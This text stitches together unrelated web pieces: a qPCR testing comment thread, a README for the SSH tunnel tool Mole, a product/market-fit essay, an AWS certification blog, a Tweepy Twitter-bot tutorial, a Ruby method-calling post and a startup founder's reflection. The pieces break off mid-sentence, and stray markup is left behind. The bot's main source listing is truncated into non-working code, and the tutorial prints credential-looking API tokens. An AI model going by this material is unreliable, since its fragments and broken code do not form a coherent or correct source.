Thank you for your article. It is my understanding the the qPCR testing currently in use also detects non replication capable rna (not virus) as well as possible virus? In fact as low as 80-100 pieces of rna per ml will produce a positive result. Wouldn’t you call a positive result of non virus a false positive? When we get one of these “positive“ results from this type of testing are we not quarantining contacts? Typically aren’t we testing at onset of symptoms? Isn’t maximum viral shedding, (infectiousness) 2.1 days before the onset of symptoms? We are in a pandemic and all testing has its place in the fight. Here are the instructions for the home test kit “ If you test positive Stop and immediately contact your health care provider or local health department as you may be contagious. If your result is negative act as if you never took the test and continue to follow your local heath department guidance. Why can’t we leave it up to the people and institutions to figure out the implementation? How many people have to die waiting for sociologists to evaluate the societal effect of false positives? By the way does anyone have a better idea than Dr.&nbsp;Mina’s. Daily home tests of contagiousness is the answer.

<pre><code>&gt; Thank you for your article.</code></pre>
<p>You are welcome. Thank you for reading and responding.</p>
<pre><code>&gt; Wouldn’t you call a positive result of
&gt; non virus a false positive?</code></pre>
<p>In effect, yes. But now it’s a matter of definitions. What do we want to be positive or negative?</p>
<p>Your points are well worth considering, but my point was that false positives do harm, as well. What kind of testing regime to implement is a public health policy decision. It should be informed by all considerations of probable harm or benefit, including sociological ones.</p>

      <p><strong>Mole</strong> is a <em>cli</em> application to create <em>ssh</em> tunnels focused on resiliency
and user experience.</p>

<div><div><pre><code><span>$ </span>mole start <span>local</span> <span>--remote</span> :3306 <span>--server</span> my-database-server
INFO[0000] tunnel channel is waiting <span>for </span>connection      <span>destination</span><span>=</span><span>"127.0.0.1:3306"</span> <span>source</span><span>=</span><span>"127.0.0.1:32863"</span>
</code></pre></div></div>

<p><strong>Highlighted Features</strong></p>

<ul>
  <li><a href="#let-mole-to-randomly-select-the-source-endpoint">Auto address selection</a>: find a port available and start listening to it, so the <code>--source</code> flag doesn’t need to be given every time you run the app.</li>
  <li><a href="#create-multiple-tunnels-using-a-single-ssh-connection">Create multiple tunnels using a single ssh connection</a>: multiple tunnels can be established using a single connection to a ssh server by specifying different <code>--destination</code> flags.</li>
  <li><a href="#create-an-alias-so-there-is-no-need-to-remember-the-tunnel-settings-afterwards">Aliases</a>: save your tunnel settings under an alias, so it can be reused later.</li>
  <li>Leverage the SSH Config File: use some options (e.g. user name, identity key and port), specified in <em>$HOME/.ssh/config</em> whenever possible, so there is no need to have the same SSH server configuration in multiple places.</li>
  <li>Resiliency! Then tunnel will never go down if you don’t want to:
    <ul>
      <li>Idle clients do not get disconnected from the ssh server since Mole keeps sending synthetic packets acting as a keep alive mechanism.</li>
      <li>Auto reconnection to the ssh server if the it is dropped by any reason.</li>
    </ul>

<h2 id="access-a-computer-or-service-behind-a-firewall">Access a computer or service behind a firewall</h2>

<p><strong>Mole</strong> can help you to <strong>access</strong> and/or <strong>expose</strong> <strong>services</strong> outside the perimeter network that are blocked by a firewall or unreachable, as long as the user has <strong>ssh</strong> access to a computer (known as <strong>Jump Server</strong>) with access to the target computer or service.</p>

<div><p>
Sean Ellis (early Dropbox, Eventbrite) found leading indicator for product/market fit.
<b>Just ask users "How would you feel if you could no longer use our product?" and measure the percent who answer "Very disappointed"</b></p><p>

If the percentage is above the 40%, you did it — you got to product/market fit.

</p>

</div>

</div>
<p>
This article is by <a target="_blank" rel="noopener nofollow" href="https://www.linkedin.com/in/rahulvohra/">Rahul Vohra</a>, the founder and CEO of <a target="_blank" href="https://superhuman.com/">Superhuman</a> — a startup building the fastest email experience in the world.
</p>
<p>
We’ve all heard that product/market fit drives startup success — and that the lack thereof is what’s lurking behind
almost every failure.
</p>
<p>
For founders, achieving product/market fit is an obsession from day one. It’s both the hefty hurdle we’re racing
to clear and the festering fear keeping us up at night, worried that we’ll never make it.
But when it comes to understanding what product/market fit really is and how to get there, most of us quickly realize that
there isn’t a battle-tested approach.
</p>
<p>
In the summer of 2017, I was waist-deep in my search for a way to find product/market fit for my startup, Superhuman.
Turning to the classic blog posts and seminal thought pieces, a few observations stuck out to me.
Y Combinator founder Paul Graham described product/market fit as when you’ve <a target="_blank" href="http://www.paulgraham.com/13sentences.html">made something that people want</a>,
while Sam Altman <a href="http://blog.samaltman.com/before-growth">characterized</a> it as when users spontaneously tell other people to use your product.
But of course, the most cited description comes from this passage in Marc Andreessen’s 2007 blog post:
</p>
<p>
“You can always feel when product/market fit is <b>not</b> happening.
The customers aren't quite getting value out of the product, word of mouth isn't spreading, usage isn't growing that
fast, press reviews are kind of ‘blah,’ the sales cycle takes too long, and lots of deals never close.
</p>
<p>
And you can always feel product/market fit when it is happening. The customers are buying the product just as
fast as you can make it — or usage is growing just as fast as you can add more servers. Money from customers
is piling up in your company checking account. You're hiring sales and customer support staff as fast as you can.
Reporters are calling because they've heard about your hot new thing and they want to talk to you about it.
You start getting entrepreneur of the year awards from Harvard Business School.
Investment bankers are staking out your house.”
</p>
<p>
For me, this was the most vivid definition — and one that I stared at through tears.
</p>
<p>
We had set up shop and started coding Superhuman in 2015. A year later, our team had grown to seven and we were still furiously coding. By the summer of 2017, we had reached 14 people — and we were still coding. I felt intense pressure to launch, from the team and also from within myself. My previous startup, <a target="_blank" rel="noopener nofollow" href="http://rapportive.com/">Rapportive</a>, had launched, scaled and been acquired by LinkedIn in less time. Yet here we were, two years in, and we had not passed go.
</p>
<p>
But no matter how intense the pressure, I wasn’t ready to launch. Common practice would be to "throw it out there and see what sticks,” which may be fine after a few months of effort when the sunk cost is low. But the “launch and see what happens” method seemed irresponsible and reckless to me — especially given the years that that we had invested.
</p>
<p>
<img alt="Rahul Vohra, Founder of Superhuman" src="https://pmfguru.com/assets/blog/Rahul-Vohra-22cbde9d5bf1eefdec11bb9c0b818b2347fbfba9465266a1c73df5333c710d03.jpg">
</p><p><small>Handsome Rahul Vohra, Founder of Superhuman</small>
</p>

<p>
Further compounding the pressure, as a founder, I couldn’t just tell the team how I felt. These super-ambitious engineers had poured their hearts and souls into the product. I had no way of telling the team we weren’t ready, and worse yet, no strategy for getting out of the situation — which is not something they would want to hear. I wanted to find the right language or framework to articulate our current position and convey the next steps that would get us to product/market fit, but was struggling to do so.
</p>
<p>
That’s because the descriptions of product/market fit I found were immensely helpful for companies <em>post-launch</em>. If, after launch, revenue isn’t growing, raising money is tough, the press doesn't want to talk to you and user growth is anemic, then you can safely conclude you don't have product/market fit. But in practice, because of my previous success as a founder, we didn’t have problems raising money. We could have gotten press, but we were actively avoiding it. And user growth wasn't happening because we deliberately choosing not to onboard more users. We were pre-launch — and we didn’t have any indicators to clearly illustrate our situation.
</p>
<p>
The descriptions of product/market fit all seemed so post hoc, so unactionable. I had a clear understanding of where we stood, but I had no way of conveying that to others — and no plan for the part that should come next.
</p>
<p>
So I racked my brain for an answer on how to travel the distance between where Superhuman was and the high bar that we needed to hit. And I eventually started to wonder: <b>what if you could measure product/market fit?</b> Because if you could measure product/market fit, then maybe you could optimize it. And then maybe you could systematically increase product/market fit until you achieved it.
</p>
<p>
Reoriented around this purpose and reinvigorated by the new direction, I set out to reverse engineer a process for getting to product/market fit. Below, I outline the findings that followed, specifically unpacking the clarifying metric that made everything fall into place and the four-step process we used to build an engine that propelled Superhuman forward on the path to finding our fit.
</p>
<h5>
ANCHORING AROUND A METRIC: A LEADING INDICATOR FOR PRODUCT/MARKET FIT
</h5>
<p>
On my quest to understand product/market fit, I read all I could and spoke with every expert I could find. Everything changed when I found Sean Ellis, who ran early early growth in the early days of Dropbox, LogMeIn, and Eventbrite and later coined the term “growth hacker.”
</p>
<div>

<p>

</h4>
<h5>

</h5>
</p>

</div>

</div>
<p>
The product/market fit definitions I had found were vivid and compelling, but they were <em>lagging</em> indicators — by the time investment bankers are staking out your house, you already have product/market fit. Instead, Ellis had found a <em>leading</em> indicator: <b>just ask users “how would you feel if you could no longer use the product?” and measure the percent who answer “very disappointed.”</b>
</p>
<p>
After benchmarking nearly a hundred startups with his customer development survey, Ellis found that the magic number was 40%. Companies that struggled to find growth almost always had less than 40% of users respond “very disappointed,” whereas companies with strong traction almost always exceeded that threshold.

Tick tock.🕐</strong></p>
<p>As the clock ticks on, with a deafening silence we have never known before, like many of us, I didn't want to sit and count those seconds scrolling by.</p>
<p>Time ain't really money (I mean we should have been rich by that logic long time back) but it sure is an opportunity.</p>
<p>So, I decided to put this period of lockdown to unlock more of my potential, by diving into the clouds!</p>
<p>The World of Big Data and Cloud Services</p>
<p>By the end of this sentence, millions and billions of bytes of data would have been sent and received. And every time that happens, there are curious minds waiting to listen to what the data is saying.</p>
<p>This ever-growing avenue led to the concept of Big Data and Cloud Services, which is becoming not just a capability, but a necessity in all fields today.
Cloud is the Captain America version of Steve Rogers, basically on-premise services on steroids. </p>
<p>Like a nineties kid, I watched the big bang of bits and bytes and revolution of the internet.
The next wave is gonna be of big data and cloud services, and this time I want to be right at the centre of it rather than being a kid staring at it with jaw-dropping to the floor.</p>
<p>Becoming an AWS Ninja!</p>
<p>When I decided to jump in the world of cloud services, the first question was to go with which tech on offer?</p>
<p>Simple. I chose AWS.</p>
<h2 id="why-">Why? 🤔</h2>
<p>Well, it's like asking why Tesla is the talk of the town and not GM anymore.
Gartner's famous Magic Quadrant released in July 2019 paints a clear picture that AWS is the lead runner in race of cloud technology.
Azure and Google are definitely catching up, but so is GM and Ford for Tesla (not yet there!)</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/uw4loiyleu6n4c521l3s.png" alt="Alt Text"></p>
<p>Even if you are working towards a promotion, or churn some more dollars, AWS is the skill to have right now.</p>
<h2 id="my-journey-of-aws-certifications-">My journey of AWS Certifications 🚴‍♀️:</h2>
<h3 id="step-1-">Step 1:</h3>
<p>My baby steps on the journey to becoming a certified developer on AWS started with the AWS Cloud Practitioner certification back in November 2019.</p>
<p>So, if you are still working towards that, this article might not be for you. You can check this article out to ace the Practitioner certification.</p>
<h3 id="step-2-">Step 2:</h3>
<p>From thereon, the next thing you need to do is practice. Try to experience AWS first hand. Explore around, learn new stuff and implement what all you need.</p>
<p>For me, working in an environment where the work revolves around cloud services was a blessing as I spent good part of the last year honing my skills on the platform before feeling ready to step up the game.</p>
<p>You can also use the <a target="_blank" rel="noopener" href="https://aws.amazon.com/free/">Free Tier</a>, Amazon provides on AWS to further brush your skills before you jump into the advance stuff.</p>
<h3 id="step-3">Step 3</h3>
<p>Resources I used 📘:</p>
<p>As much as one would love to have a single source for all there is to learn, more often than not we need to club multiple sources to get the most out of them.
For AWS, <a target="_blank" rel="noopener" href="https://acloud.guru/learn/aws-certified-solutions-architect-associate">ACloud Guru's Solutions Architect Associate</a> course and another one by <a target="_blank" rel="noopener" href="https://youtu.be/Ia-UEYYR44s">Andrew Brown on freecodecamp's youtube channel</a> worked the best for me.</p>
<h3 id="step-4">Step 4</h3>
<p>One of the biggest add on for me, was to go through the FAQ's provided by AWS for service's like <a target="_blank" rel="noopener" href="https://aws.amazon.com/s3/faqs/">S3</a>, <a target="_blank" rel="noopener" href="https://aws.amazon.com/ec2/faqs/">EC2</a>, <a target="_blank" rel="noopener" href="https://aws.amazon.com/elasticloadbalancing/faqs/">Load Balancers</a>, <a target="_blank" rel="noopener" href="https://aws.amazon.com/vpc/faqs/">VPC</a>and <a target="_blank" rel="noopener" href="https://aws.amazon.com/route53/faqs/">Route53</a>.
This will help to clear all your doubts and get you better prepared for the test.</p>
<h3 id="step-5-practice-tests">Step 5: Practice Tests</h3>
<p>Nothing sets you up nicely for the real test than the practice tests.
It might be boring, but believe me, they will go a long way as a reality check for you.</p>
<p><a target="_blank" rel="noopener" href="https://www.whizlabs.com/">Whizlabs</a> provides the best tests out there at a minimal cost at $17(may have changed). The 7 practice tests are the seven steps to clearing your test.
In case you have passed the previous AWS certificate for Cloud Practitioner, you are provided with a free practice test and 50% off for the exam fee as well.</p>
<h3 id="step-6-support">Step 6: Support</h3>
<p>I would recommend to join the <a target="_blank" rel="noopener" href="https://www.freecodecamp.org/news/awscertified-challenge-free-path-aws-cloud-certifications/">#AWSCertified</a> challenge and the #100DaysOfCloud. Here is the <a target="_blank" rel="noopener" href="https://discord.gg/dvUh79v">discord for #100DaysOfCloud</a>.
I am available for any doubt clarification or any other stuff you might need.</p>
<h3 id="step-7-notes">Step 7: Notes</h3>
<p>If you just want to refresh your concepts or want to just go through concise notes before the tests, I have posted them <a target="_blank" rel="noopener" href="https://rishabkumar7.github.io/CloudNotes/">here</a> for your reference.</p>
<h3 id="step-8-the-t-day">Step 8: The T-Day</h3>
<p>Well, if you are here, it means you are ready for the test!
Just fill up for the test and in no time you will be a certified AWS Solution Architect.</p>
<p>I took around 15 days to brush up my skills, go through practice tests before I went ahead to ace my test.
It might take a little longer/shorter for you, but following these steps will certainly set you up for the test.</p>
<p>And you can follow me on <a target="_blank" rel="noopener" href="https://twitter.com/rishabk7">Twitter</a> to see my journey in the Cloud☁</p>
<p><strong>Good Luck 👍</strong></p>

<h2 id="what-is-tweepy-">What Is Tweepy 🐣?</h2>
<p>Tweepy is an open-source Python package that gives you a very convenient way to access the Twitter API with Python. Tweepy includes a set of classes and methods that represent Twitter’s models and API endpoints, and it transparently handles various implementation details, such as:
Data encoding and decoding
HTTP requests
Results pagination
OAuth authentication
Rate limits
Streams
If you weren’t using Tweepy, then you would have to deal with low-level details having to do with HTTP requests, data serialization, authentication, and rate limits. This could be time-consuming and prone to error. Instead, thanks to Tweepy, you can focus on the functionality you want to build.</p>
<h2 id="going-on-with-the-azurecertified-bot-">Going on with the #AzureCertified Bot 🤖</h2>
<p>Below is the source code for the config module. It contains create_api(), a function that reads authentication credentials from environment variables and creates the Tweepy API object:</p>
<pre><code>
<span>import</span> tweepy
<span>import</span> logging
<span>import</span> os

logger = logging.getLogger()

<span><span>def</span> <span>create_api</span><span>()</span>:</span>
    consumer_key = os.getenv(<span>"CONSUMER_KEY"</span>)
    consumer_secret = os.getenv(<span>"CONSUMER_SECRET"</span>)
    access_token = os.getenv(<span>"ACCESS_TOKEN"</span>)
    access_token_secret = os.getenv(<span>"ACCESS_TOKEN_SECRET"</span>)

    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_token, access_token_secret)
    api = tweepy.API(auth, wait_on_rate_limit=<span>True</span>, 
        wait_on_rate_limit_notify=<span>True</span>)
    <span>try</span>:
        api.verify_credentials()
    <span>except</span> Exception <span>as</span> e:
        logger.error(<span>"Error creating API"</span>, exc_info=<span>True</span>)
        <span>raise</span> e
    logger.info(<span>"API created"</span>)
    <span>return</span> api
</code></pre>
<p>This bot uses the previously introduced Tweepy stream to actively watch for tweets that contain certain keywords. For each tweet, if you’re not the tweet author, it will mark the tweet as Liked and then retweet it.</p>
<p>You can use this bot to feed your account with content that is relevant to your interests.</p>
<p>Bot Source Code</p>
<p>Below, you can see the full source code of this bot. It uses a stream to filter tweets that contain the word "#AzureCertified". Each tweet from the stream is marked as Liked and retweeted:</p>
<pre><code>


<span>import</span> tweepy

    stream.filter(track=keywords, languages=[<span>"en"</span>])

<span>if</span> __name__ == <span>"__main__"</span>:
    main([<span>"#AzureCertified"</span>])
</code></pre>
<h2 id="building-the-docker-image-">Building the Docker Image 🐳</h2>
<p>To package your bot or application, you have to create a Dockerfile in the project’s root directory. This file contains a set of instructions used to create the Docker image containing your app.
This is how your project structure should look:</p>
<pre><code>tweepy-bots/
│
├── bots/
│   ├── config.py
│   └── favretweet.py
│
├── requirements.txt
└── Dockerfile
</code></pre><p>You can use the following Dockerfile to create the image for the Fav &amp; Retweet bot. It uses Python:3.7-alpine as the base image. We chose this image as the base since it’s very small and contains Python3.7 and pip. This Dockerfile then copies the bot code and the requirements.txt file to the image. Finally, the dependencies are installed inside the image using pip3:</p>
<pre><code>FROM python:<span>3.7</span>-alpine

COPY bots/config.py /bots/
COPY bots/favretweet.py /bots/
COPY requirements.txt /tmp
RUN pip3 install -r /tmp/requirements.txt

WORKDIR /bots
CMD [<span>"python3"</span>, <span>"favretweet.py"</span>]
</code></pre>
<p>The final line says what command must be run when this image is used.</p>
<p>Now you can build the image using this command:</p>
<p><code>$ docker build . -t fav-retweet-bot</code></p>
<p>Finally, you can use the docker run command to test the image, passing it the environment variables holding the authentication credentials:</p>
<pre><code>$ docker run -it <span>-e</span> CONSUMER_KEY=<span>"nMRNy54oWfdfssdfsV9AoNavy0I"</span> \
 <span>-e</span> CONSUMER_SECRET=<span>"olAL5VAgZLWNspsdajff757kmsPEwuxpvLCLSR08DMa4O"</span> \
 <span>-e</span> ACCESS_TOKEN=<span>"792518593-j7gWSqzQO31ju7Bfdsf7NlZeSENsuADGU9B90r"</span> \
 <span>-e</span> ACCESS_TOKEN_SECRET=<span>"fusFsxvP5IglRckJ1I1why6017xMNkzxqBID48Azw0IoT"</span> \
 fav-retweet-bot
</code></pre>
<h2 id="deploying-it-to-azure-vm">Deploying it to Azure VM</h2>
<h3 id="step-1-export-the-docker-image">Step 1: Export The Docker Image</h3>
<p>From the computer where you have created the Docker image, run these commands to export it to a file. You’re going to use this file later to upload the image to your Azure VM:</p>
<p><code>$ docker image save fav-retweet-bot:latest -o fav-retweet-bot.tar</code></p>
<h3 id="step-2-install-docker-on-your-azure-vm">Step 2: Install Docker on your Azure VM</h3>
<p>Once you’re connected, run the following commands to install Docker on the VM:</p>
<pre><code>AzureUser@TwitterBot:~$ sudo apt-get update
AzureUser@TwitterBot:~$ sudo apt install docker.io
AzureUser@TwitterBot:~$ sudo adduser ubuntu docker
</code></pre>
<h3 id="step-3-upload-your-bot-s-docker-image">Step 3: Upload Your Bot’s Docker Image</h3>
<p>From your local computer, upload the bot Docker image to your VM using scp. This can take some time depending on your internet connection:</p>
<p><code>scp fav-retweet-bot.tar AzureUser@13.196.128.199:/</code></p>
<p>Now connect to the Azure VM and load the docker image
<code>AzureUser@TwitterBot:~$ docker image load -i fav-retweet-bot.tar</code></p>
<h3 id="step-4-run-your-bot-s-docker-image">Step 4: Run Your Bot’s Docker Image</h3>
<p>The final step to deploy the bot is to run the Docker image in your Azure VM, passing it the authentication credentials.</p>
<p>You can do this using the docker command. Passing the flags -d and --restart-always assures that the bot will keep running if you disconnect from the SSH session or if the VM is restarted:</p>
<pre><code>AzureUser@TwitterBot:~$ docker run <span>-d</span> --restart always \
<span>-e</span> CONSUMER_KEY=<span>"nMRNy54oWfdfssdfsV9AoNavy0I"</span> \
 <span>-e</span> CONSUMER_SECRET=<span>"olAL5VAgZLWNspsdajff757kmsPEwuxpvLCLSR08DMa4O"</span> \
 <span>-e</span> ACCESS_TOKEN=<span>"792518593-j7gWSqzQO31ju7Bfdsf7NlZeSENsuADGU9B90r"</span> \
 <span>-e</span> ACCESS_TOKEN_SECRET=<span>"fusFsxvP5IglRckJ1I1why6017xMNkzxqBID48Azw0IoT"</span> \
 fav-retweet-bot
</code></pre>
<p>Using docker ps, you can check that the bot is running and find its container id. Finally, using the docker logs command and the container id, you can check the output from the bot to see if it works properly:</p>
<pre><code>AzureUser@TwitterBot:~$ docker logs f4aefe89a890
INFO:root:API created
INFO:root:Processing tweet id 1218244916562785538
INFO:root:Processing tweet id 1418486946762214918
</code></pre>
<p>Now, even if you disconnect from the SSH session or turn off your computer, the bot will continue to run on your Azure VM.</p>

            <section>
                <div>
                    <p>Today during a chat with one of my colleagues we discussed agreeing on certain ways to write our Python code. We joked about how Python follows this idea of having exactly one way to do each thing (which is usually followed by the language, but not necessarily by libraries). It made me think about Ruby, which has opposite philosophy - everything can be done in many different ways.</p><p>This led me to a random idea of checking in how many different ways I can call a single method in Ruby. I ended up with 12 different ways (a couple are a bit of cheating). Prepare for some surprises below - especially the last one is mind blowing!</p><p><strong>Warning</strong> the code below is not meant for use in production (especially the last 3 examples). It is just my exploration of the language capabilities. Some of the techniques shown are useful in a bunch of cases, but make sure to proceed with caution. Simplicity, security and readability are more important than fancy stuff.</p><h2 id="setup">Setup</h2><p>For the sake of this experiment, I'm setting up a single class with one method that I'll be calling in many different ways. For the sake of simplicity, the method takes no arguments (although I believe each exaple would work with arguments as well).</p><p>The class is called <code>User</code>, it has 1 attribute, <code>name</code>, and the method to be called is <code>hello</code>, which prints a welcome message, including user name.</p><pre><code>class User
  def initialize(name)
    @name = name
  end

  def hello
    puts "Hello, #{@name}!"
  end

  def method_missing(_)
    hello
  end
end

user = User.new('Gregory')</code></pre><h2 id="1-the-obvious-way">1: the obvious way</h2><pre><code>user.hello()</code></pre><p>Not much to see here - this is how you call methods in plenty of languages. Interesting fact: you can put spaces around the dot: <code>user &nbsp;. &nbsp;hello()</code> will work as well.</p><h2 id="2-skip-the-brackets">2: skip the brackets</h2><pre><code>user.hello</code></pre><p>Technically it works the same as one before, it just skips brackets, which are optional in Ruby (as long as the code is unambiguous, sometimes they are required due multiple ways in which the code could be parsed)</p><h2 id="3-4-using-send-and-public_send">3-4: using send and public_send</h2><pre><code>user.send(:hello)
user.public_send(:hello)</code></pre><p>In this case we pass the name of the function to be called as an argument to either <code>send</code> or <code>public_send</code> methods that are defined in every class. The difference between <code>send</code> and <code>public_send</code> is that the latter respects the privacy of methods - if you try to call private method, it will raise an error, while <code>send</code> will still call it.</p><p>I'm passing the name of the function using symbol type (<code>:hello</code>), but you can use string as well &nbsp;(<code>"hello"</code>).</p><h2 id="5-7-using-method-and-call">5-7: using "method" and "call"</h2><pre><code>user.method(:hello).call
user.method(:hello).()
user.method(:hello)[]</code></pre><p>3 examples, with the 2nd and 3rd being just a syntax sugar, so I put them together. This one is quite interesting. Calling <code>user.method(:hello)</code> returns an instance of <code>Method</code> class. This object can be passed around as any value and can be called any time - it also stores the reference to the object to which it belongs, so if I change the user's name, the new one will be used:</p><pre><code>method = user.method(:hello)
user.set_instance_variable(:@name, "Not Only Code")
method.call() # prints "Hello, Not Only Code!"</code></pre><p>The <code>.()</code> and <code>[]</code> are equivalent of <code>.call()</code> and can also take arguments - <code>proc.call(1,2,3)</code>, <code>proc.(1,2,3)</code> and <code>proc[1,2,3]</code> will all work the same way (the last one won't support named arguments though).</p><h2 id="8-using-tap">8: using "tap"</h2><pre><code>user.tap(&amp;:hello)</code></pre><p><code>tap</code> is a funny little method that takes a block, passes itself as an argument there and executes the block, and then finally returns itself. I rarely use it, but there are cases where it might be helpful (like side effects when chaining methods).</p><p>The <code>&amp;:hello</code> syntax turns the <code>:hello</code> symbol into a <code>Proc</code> instance. You can read more about this syntax on <a href="https://www.honeybadger.io/blog/how-ruby-ampersand-colon-works/">Honeybadger blog</a> - it's really well explained there. <code>Proc</code> is a callable object, just like <code>Method</code> from previous examples.</p><h2 id="9-using-to_proc-on-function-name">9: using "to_proc" on function name</h2><pre><code>:hello.to_proc.call(user)</code></pre><p>I like this one because it reverses the order - <code>user</code> becomes the argument of the function. What happens under the hood here is very similar to the previous one - the <code>call</code> function of <code>Proc</code> passes the initial symbol to the argument received. Something similar to this:</p><pre><code>class Proc
  def call(obj)
    obj.send(@symbol_used_to_create_proc)
  end
end</code></pre><h2 id="10-using-method_missing">10: using "method_missing"</h2><pre><code>class User
  def method_missing(_)
    hello
  end
end

user.i_am_a_lizard_king # prints "Hello, Gregory!"
user.i_can_do_everything # prints "Hello, Gregory!"</code></pre><p>This one is a bit of cheating, since still under the hood I use the standard way of calling a method, but I think it's worth putting it here.</p><p><code>method_missing</code> is a method that will be executed when object receives a call to a method that is not defined. It's a powerful function that is one of fundaments of Ruby's flexibility, however it might lead to bugs that take ages to find (and to some perfomance issues), so use it with caution.</p><h2 id="11-using-eval">11: using "eval"</h2><pre><code>eval("user.hello")</code></pre><p>Again, a bit of cheating, since I still use the standard method call syntax, but how it works under the hood is obviously very different. <code>eval</code> passes the string to Ruby parser and interpreter just as if it was a part of my code, and then executes the code. You should definitely, absolutely avoid using it in your code, especially if you allow users to pass some values to your application.</p><h2 id="12-using-source-and-instance_eval">12: using "source" and "instance_eval"</h2><pre><code>require 'method_source' # external gem

method_source = user.method(:hello).source
method_body = method_source.split("\n")[1...-1].join(";")
user.instance_eval(method_source)</code></pre><p>Ok, the last one - and it's quite crazy, so explantion is a bit longer. It relies on external gem, called <a href="https://github.com/banister/method_source">method_source</a>, but that's because it would take me too much time and space to write this code here (it's all just Ruby though, no magic!). Let me explain how it works:</p><p><code>user.method(:hello).source</code> returns the source of the method as a string. The output of this is the whole body (including the spaces):</p><pre><code>  def hello
    puts "Hello, #{@name}!"
  end</code></pre><p>How does <code>method_source</code> gem do it? The <code>Method</code> class in Ruby has a <code>source_location</code> function that returns the location of the method's source code - file and line number where the method starts. Then <code>method_source</code> essentially opens that file, finds the respective line, looks for <code>end</code> that will end the method and returns the code in between.</p><p>Now that I have the full code of the method, I want to remove the method definition and the <code>end</code>. In my case I just remove the first and last line, but if the method was a one-liner, it would require some changes. The output of the 2nd line is a string with value: <code>puts "Hello, #{@name}!"</code> .</p><p>Finally, I take this string and I pass it to <code>instance_eval</code> of my <code>user</code> object. <code>instance_eval</code> works kind of like <code>eval</code> except that it executes code in different scope. If I call <code>eval</code> it would execute code in scope of my whole file, where the <code>@name</code> variable is not defined. By passing it to <code>instance_eval</code> I ensure it uses the correct values.</p><h2 id="is-there-more">Is there more?</h2><p>That was a fun little experiment. I'm pretty sure there are some more ways to call methods in Ruby - it's a large and very flexible language. If you know some other ways, let me know, I'm very curious!</p><p>And if you enjoy my content, check out my <a href="https://www.youtube.com/channel/UCj3PDQ-4n9sO0j3t2j608WQ">YouTube channel, Not Only Code</a>, where I'm talking about different aspects of working as a software developer.</p>

<p><em>“I feel useless. This is not our place.”</em></p>



<p>It all came out of my mouth while working with my brother.&nbsp;</p>



<p>That was a feeling we both had been sharing for long. This time I had just said it out loud.</p>



<p>After having failed twice with our previous startups, we were trying one more time.&nbsp;</p>



<p>However, having been looking for success for more than 6 years, this one looked like our last chance.</p>



<p>Little was the energy and money that remained on us. We were on the ropes.</p>



<p>Once again, we found ourselves searching for a new business idea —a problem worth solving and a viable business model.</p>



<p>We were desperately trying to come up with a new idea out of thin air. And again, we’d just hit a wall.</p>



<p>One more time, the pieces were falling down. So we were back at the starting point.&nbsp;</p>



<p>It felt like we were always running in circles.&nbsp;</p>



<p>After all the energy and effort, nothing seemed to work. We felt we’d grown a lot. We’d learned many valuable skills. Yet, nothing appeared to make a difference.</p>



<p>And as if that wasn’t enough, we felt tremendously undervalued by people in our environment.</p>



<p>It was devastating.</p>



<p><em>“We need to move forward once and for all.”&nbsp;</em>—that was the always present thought.&nbsp;</p>



<p>Nonetheless, this time we had reached a breaking point. We needed to do things differently.&nbsp;</p>



<p>Up to that point, we had always relied on the standard advice.&nbsp;</p>



<p>We followed Lean Startup and designed Lean Canvases, traction models, and all the paraphernalia.</p>



<p>We made customer discovery, interviewed people, did surveys, performed market experiments, and built MVPs.</p>



<p>We created landing pages, run Facebook Ads campaigns, and used many of the usual tools and tactics.&nbsp;</p>



<p>We tried everything.&nbsp;</p>



<p>And still, nothing worked.</p>



<p>Now, one thing was clear. We needed to find another way.&nbsp;</p>



<p>After lots of research and conversations, I’m sure this is more common than it seems.&nbsp;</p>



<p>It’s a real struggle for many. And if that’s your case, stay calm. You’re not alone.</p>



<p>Today I’m sharing what I believe was the most important lesson we learned along over ten years of hard learning to find a solution that worked for us.&nbsp;</p>



<p>We hope it will help you as well to start making progress once and for all.</p>

<p>I jumped into my first independent startup venture more than eight years ago.</p>



<p>At that time, I’d just left Facephi, the startup I joined as CTO, just as it started its journey.&nbsp;</p>



<p>After more than four years, a pretty nice salary, a remarkable product out into the market, and 2+ million acquired in investor funding, I felt the time for a change had come.</p>



<p>I wanted to keep growing.&nbsp;</p>



<p>I was trying to run away from things I didn’t want in my life. And I desired to become happier and more fulfilled.&nbsp;</p>



<p>But my idea of what all that meant was pretty fuzzy by then.</p>



<p>So I got dragged by the status quo.</p>



<p>I got inspired by the billion-dollar tech companies.</p>



<p>I studied and applied all of the recommended tools, the popular formulas.</p>



<p>However, starting a path without knowing what I was actually seeking was a ticket for disaster.</p>



<figure><blockquote><p>Would you tell me, please, which way I ought to go from here? —said Alice.<br>That depends a good deal on where you want to get to. —said the Cat.<br>I don’t much care where. —said Alice.<br>Then it doesn’t matter which way you go. —said the Cat.</p><cite>Lewis Carrol, Alice in Wonderland.</cite></blockquote></figure>



<p>Where was I actually trying to get to? That’s the question I started asking myself following our last failure.</p>



<p>I had an intuition, but I’d never taken the time to reflect deep enough on it. I must admit that, up to that point, and to some extent, I’d looked outside for answers.</p>



<p>I needed to find the reasons why I was doing what I was doing. So, after a profound exercise of introspection and 6+ years of hustling, I found out what I was searching for.</p>



<p>In essence, I wanted to be freer to do what intrinsically moves me.&nbsp;</p>



<p>I wanted to feel useful and, what’s more important, live ethically. I felt a deep desire to do the right thing.</p>



<p>This was the purpose I expected entrepreneurship to fulfill in my life. That was what success looked like to me.</p>



<p>However, what I got was captivity. I became a slave of my business and all the different stakeholders around.</p>



<p>I had little time for what I enjoyed doing. I was dragged by meetings, external requests, recruiting, managing people, looking for funding, doing administrative tasks, putting out fires in general, and carrying out other unfulfilling stuff.</p>



<p>As a consequence, everything I did was useless. I couldn’t focus on the important, and I couldn’t deliver any meaningful progress for customers and my environment.</p>



<p>And to top it all, it affected my personal life as well.</p>



<p>I didn’t have much time for family and friends anymore. I started doing far less physical exercise, began eating and sleeping worse, and had to renounce other goals. </p>



<p>I neglected my health and wellbeing.</p>



<p>The case of my brother was no different.</p>



<p>It was evident that we’d made many unfitting calls.</p>



<h2><strong>Don’t starve looking for a solution.</strong></h2>



<p>This valuable discovery caused a radical shift in our way of thinking.</p>



<p>It was like finding a light in the middle of darkness.&nbsp;</p>



<p>Everything became pretty more clear. Without knowing where we wanted to get to, it was barely impossible to get to our right place.</p>



<p>The question is that, when everything started, I didn’t know that I didn’t know it&nbsp;<em>—</em>even though I thought I did.&nbsp;</p>



<p>It’s easy to not notice it. Society bombards you with deceptive images of success and demands you to follow them.&nbsp;</p>



